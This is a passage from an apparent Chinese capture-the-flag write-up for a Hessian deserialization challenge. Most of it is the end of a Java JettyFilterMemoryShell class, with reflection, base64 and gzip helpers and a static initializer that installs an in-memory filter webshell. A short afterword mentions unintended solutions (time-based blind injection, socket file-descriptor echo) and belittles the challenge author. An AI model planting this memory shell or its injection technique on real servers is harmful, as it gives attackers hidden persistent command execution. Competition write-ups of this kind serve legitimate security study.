            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);  
            return (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);  
        } catch (Exception var3) {  
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");  
            return (byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);  
        }  
    }  
  
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {  
        ByteArrayOutputStream out = new ByteArrayOutputStream();  
        GZIPInputStream gzipInputStream = null;  
  
        byte[] var5;  
        try {  
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));  
            byte[] buffer = new byte[4096];  
  
            int n;  
            while((n = gzipInputStream.read(buffer)) > 0) {  
                out.write(buffer, 0, n);  
            }  
  
            var5 = out.toByteArray();  
        } finally {  
            if (gzipInputStream != null) {  
                gzipInputStream.close();  
            }  
  
            out.close();  
        }  
  
        return var5;  
    }  
  
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {  
        for(Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {  
            try {  
                Field field = clazz.getDeclaredField(name);  
                field.setAccessible(true);  
                return field.get(obj);  
            } finally {  
  
            }  
        }  
  
        throw new NoSuchFieldException(name);  
    }  
  
    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {  
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);  
    }  
  
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {  
        try {  
            Class<?> clazz = obj instanceof Class ? (Class)obj : obj.getClass();  
            Method method = null;  
  
            while(clazz != null && method == null) {  
                try {  
                    if (paramClazz == null) {  
                        method = clazz.getDeclaredMethod(methodName);  
                    } else {  
                        method = clazz.getDeclaredMethod(methodName, paramClazz);  
                    }  
                } catch (NoSuchMethodException var7) {  
                    clazz = clazz.getSuperclass();  
                }  
            }  
  
            if (method == null) {  
                throw new NoSuchMethodException("Method not found: " + methodName);  
            } else {  
                method.setAccessible(true);  
                return method.invoke(obj instanceof Class ? null : obj, param);  
            }  
        } catch (NoSuchMethodException e) {  
            throw e;  
        } catch (Exception e) {  
            throw new RuntimeException("Error invoking method: " + methodName, e);  
        }  
    }  
  
    static {  
        new JettyFilterMemoryShell();  
    }  
}
```
实际效果
<img src="https://i.miji.bid/2025/05/10/f0bdd92de37627c0c8035f43d6cc8ad4.png" alt="f0bdd92de37627c0c8035f43d6cc8ad4.png" border="0">

## 后记
hdHessian 预期是内存马，但是解都是非预期，有时间盲注，还有写 socket fd 回显的。出题人是 fw
